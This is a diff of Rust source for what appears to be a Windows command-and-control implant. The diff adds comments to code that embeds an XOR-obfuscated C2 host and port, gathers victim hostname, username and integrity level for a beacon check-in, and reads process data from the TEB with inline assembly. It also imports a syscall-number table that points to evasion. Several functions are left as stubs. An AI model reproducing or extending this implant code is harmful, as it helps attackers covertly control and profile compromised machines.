@@ -4,6 +4,7 @@ use crate::core::net::transport::HttpSession;
 use crate::debug;
 use crate::core::ssn_table;
 
+// Build time C2 config (XORed and embedded by build.rs)
 pub struct C2Config<'a> {
     pub host: &'a [u16],
     pub port: u16,
@@ -13,6 +14,7 @@ pub struct C2Config<'a> {
     pub jitter_pct: u8,
 }
 
+// Gather system info for beacon check in
 struct SysInfo {
     hostname: String,
     username: String,
@@ -23,6 +25,9 @@ struct SysInfo {
     integrity: &'static str,
 }
 
+/**
+ * Generate a session ID by hashing PID + RDTSC 
+ * */
 unsafe fn generate_session_id() -> String {
     let pid = get_current_pid();
     let tsc: u64;
@@ -53,6 +58,9 @@ unsafe fn generate_session_id() -> String {
     id
 }
 
+/**
+ * Get current process ID from TEB
+ * */
 unsafe fn get_current_pid() -> u32 {
     let teb: u64;
     core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);    
@@ -60,18 +68,30 @@ unsafe fn get_current_pid() -> u32 {
     *pid_ptr as u32
 }
 
+/**
+ * TODO
+ * */
 unsafe fn get_rough_timestamp() -> i64 {
     1
 }
 
+/**
+ * Resolve the current process image name from PEB at runtime
+ * */
 unsafe fn get_process_name_from_peb() -> String {
     unimplemented!()
 }
 
+/**
+ * Query the current process integrity level
+ * */
 unsafe fn query_integrity_level() ->  &'static str {
     unimplemented!()
 }
 
+/**
+ * Build the beacon check in JSON payload
+ * */
 fn build_beacon_json(session_id: &str, info: &SysInfo) -> Vec<u8> {
     let mut w = JsonWriter::new();
     w.begin_object();
